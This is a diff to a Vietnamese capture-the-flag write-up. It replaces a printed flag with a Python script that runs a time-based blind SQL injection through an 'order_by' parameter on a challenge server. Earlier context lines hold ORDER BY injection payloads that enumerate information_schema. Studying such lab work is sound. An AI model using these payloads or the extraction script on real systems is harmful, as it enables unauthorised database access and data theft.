@@ -852,6 +852,32 @@ while True:
 9. Biết được bảng này chỉ có 1 cột: `(CASE WHEN ((SELECT COUNT(*) FROM information_schema.columns where table_name = 'flag') = 1) THEN id ELSE price END);--`
 10. Cột duy nhất có tên là flag luôn. `(CASE WHEN ((SELECT COLUMN_NAME FROM information_schema.columns where table_name = 'flag') = 'flag') THEN id ELSE price END);--`
 11. Tìm từng ký tự ``(CASE WHEN ((SELECT SUBSTR(flag, 1, 3) from flag) = 'CHH') THEN id ELSE price END);--``
-12. Mệt @@ `CHH{inj3ct1on_0rder_gr0up_claus3}`
+12. Exploit code:
+```
+import requests as rq
+
+url="http://103.97.125.56:32119"
+charset="}{_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+res=""
+ok=1
+i=1
+while(True):
+    ok=0
+    for c in charset:
+        payload="(CASE WHEN ((SELECT ASCII(substring(flag,{},1)) FROM flag)=ASCII('{}')) THEN SLEEP(0.05) ELSE id END)".format(i,c)
+        r = rq.get(url,params={"order_by":payload})
+        res_time=r.elapsed.total_seconds()
+        print("Checking --- index",i," ->",c,end="\r")
+        if(res_time>0.5):
+            i+=1
+            res+=c
+            print("FOUND =>",c," ===> Flag: ",res)
+            ok=1
+            break
+    if(ok==0):
+        break
+    
+print("FLAG=",res)
+```
 
 ## 
